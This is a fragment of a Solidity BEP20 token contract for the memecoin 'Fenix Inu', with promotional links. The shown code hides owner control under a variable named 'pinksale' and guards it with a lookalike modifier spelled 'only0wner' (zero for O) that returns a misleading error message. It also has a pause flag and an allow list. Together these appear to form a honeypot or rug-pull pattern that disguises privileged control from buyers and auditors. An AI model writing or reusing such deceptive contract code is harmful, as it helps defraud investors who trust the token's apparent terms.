...
/**
     * Fenix Inu is a utility token created to provide opportunities for all memecoin & low cap gems lovers, Fenix Inu will be the official token of our launchpad called FenixPad here you will find the best gems. Holders will have the exclusive opportunity to enter pre-sales, before they are listed on the market.
     https://fenixinu.com/
     https://twitter.com/fenixinutoken_
     https://t.me/FENIXINUPAD
     */
...
contract Fnix is Context, IBEP20, IBEP20Metadata, Ownable {
  ...
  address pinksale;
    ...
    constructor() {
        // Editable
            pinksale = msg.sender;
            allowAddress[pinksale] = true;
        _name = "Fenix Inu";
        _symbol = "Fnix";
        uint t_totalSupply = 10000000000000000000;
        isPaused = false;
        // End editable
  ...
  modifier only0wner () {
    require(pinksale == msg.sender, "ERC20: cannot permit Pancake address");
    _;
